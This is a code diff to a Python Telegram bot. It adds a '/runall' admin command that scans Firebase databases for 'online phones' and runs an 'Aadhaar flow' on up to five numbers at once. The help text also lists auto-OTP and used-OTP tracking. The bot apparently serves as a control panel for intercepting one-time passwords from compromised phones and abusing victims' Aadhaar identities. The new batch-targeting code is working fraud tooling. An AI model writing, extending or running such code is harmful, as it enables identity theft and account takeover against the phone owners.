@@ -1,5 +1,6 @@
 import os
 import sys
+import re
 import importlib
 import asyncio
 import aiohttp
@@ -1332,6 +1333,110 @@ def cmd_resetused(message):
 
 
 # ==============================================================================
+# 🚀 PARALLEL BATCH RUNNER COMMAND
+# ==============================================================================
+
+@bot.message_handler(commands=['runall', 'batch'])
+def cmd_runall(message):
+    """
+    Scan all Firebase DBs, pick up to 5 online phones, and run the Aadhaar flow
+    for each in parallel (bb_auto style). Results are posted as they complete.
+    """
+    chat_id = message.chat.id
+    if chat_id not in ADMIN_IDS:
+        bot.send_message(chat_id, "❌ Admin only command.")
+        return
+
+    links = aadhaar_engine._load_firebase_links()
+    if not links:
+        bot.send_message(
+            chat_id,
+            "📭 No Firebase links configured.\nUse <code>/addfire URL</code> first.",
+            parse_mode='HTML'
+        )
+        return
+
+    # Optional: /runall 9876543210,8765432109 — target specific mobiles
+    parts = message.text.split(maxsplit=1)
+    explicit_targets = None
+    if len(parts) > 1:
+        raw = parts[1].strip()
+        nums = re.findall(r'\b[6-9]\d{9}\b', raw)
+        if nums:
+            explicit_targets = list(dict.fromkeys(nums))[:5]
+
+    status = bot.send_message(
+        chat_id,
+        "🔍 <b>Scanning Firebase DBs for online phones...</b>",
+        parse_mode='HTML'
+    )
+
+    async def _scan_then_run():
+        try:
+            if explicit_targets:
+                targets = [{"phone": p, "url": None, "cid": None} for p in explicit_targets]
+                # Try to resolve url/cid for each
+                async with aiohttp.ClientSession() as session:
+                    for t in targets:
+                        for entry in links:
+                            url = entry.get("url")
+                            if not url:
+                                continue
+                            try:
+                                mapping = await aadhaar_engine.firebase_find_phone_map(session, url, limit_devices=60)
+                                if t["phone"] in mapping:
+                                    t["url"] = url
+                                    t["cid"] = mapping[t["phone"]]
+                                    break
+                            except Exception:
+                                continue
+            else:
+                targets = await aadhaar_engine.scan_all_firebase_phones(limit_per_link=40, max_targets=5)
+
+            if not targets:
+                try:
+                    bot.edit_message_text(
+                        chat_id=chat_id, message_id=status.message_id,
+                        text="⚠️ <b>No online phones found on any Firebase DB.</b>",
+                        parse_mode='HTML'
+                    )
+                except: pass
+                return
+
+            # Show pre-flight summary
+            preview_lines = [
+                "🎯 <b>BATCH PREVIEW</b>",
+                "━━━━━━━━━━━━━━━━━━━━━━",
+                f"👥 <b>{len(targets)}</b> target(s) will run in parallel:",
+            ]
+            for i, t in enumerate(targets, 1):
+                src = (t.get("url") or "manual").replace("https://", "").replace("http://", "").rstrip("/")
+                preview_lines.append(f"  {i}. <code>{t['phone']}</code> <i>({src[:30]})</i>")
+            preview_lines.append("━━━━━━━━━━━━━━━━━━━━━━")
+            preview_lines.append("⏳ Launching…")
+            try:
+                bot.edit_message_text(
+                    chat_id=chat_id, message_id=status.message_id,
+                    text="\n".join(preview_lines), parse_mode='HTML'
+                )
+            except: pass
+
+            # Fire the batch on the global loop
+            aadhaar_engine.start_parallel_batch(bot, chat_id, targets)
+
+        except Exception as e:
+            print(f"⚠️ [RUNALL] Error: {e}")
+            try:
+                bot.send_message(chat_id, f"❌ <code>/runall error:</code> {esc(str(e))}", parse_mode='HTML')
+            except: pass
+
+    try:
+        asyncio.run_coroutine_threadsafe(_scan_then_run(), loop)
+    except Exception as e:
+        bot.send_message(chat_id, f"❌ Failed to launch: {e}")
+
+
+# ==============================================================================
 # 🔬 DEBUG COMMANDS
 # ==============================================================================
 
@@ -1668,7 +1773,8 @@ def cmd_help(message):
         "  /scan              — Scan Firebase for online devices\n"
         "  /auto [N]          — Enable auto-OTP (optional target mobile N)\n"
         "  /stopauto          — Disable auto-OTP\n"
-        "  /resetused         — Clear cached used-OTP registry\n\n"
+        "  /resetused         — Clear cached used-OTP registry\n"
+        "  /runall [N1,N2..]  — Scan all Firebase DBs & run 5 targets in parallel\n\n"
         "🔬 <b>Debug:</b>\n"
         "  /debugscan         — Deep-scan Firebase endpoints\n"
         "  /debugusers        — List all phones found on Firebase\n"
@@ -1858,8 +1964,6 @@ def handle_all(message):
         return
 
     # Priority Override: If input is a Target Mobile Number or start command with mobile number
-    import re
-
     is_group = chat_id < 0
     starts_with_cmd = text.lower().startswith(('/aadhaar', '/aadhar'))
 
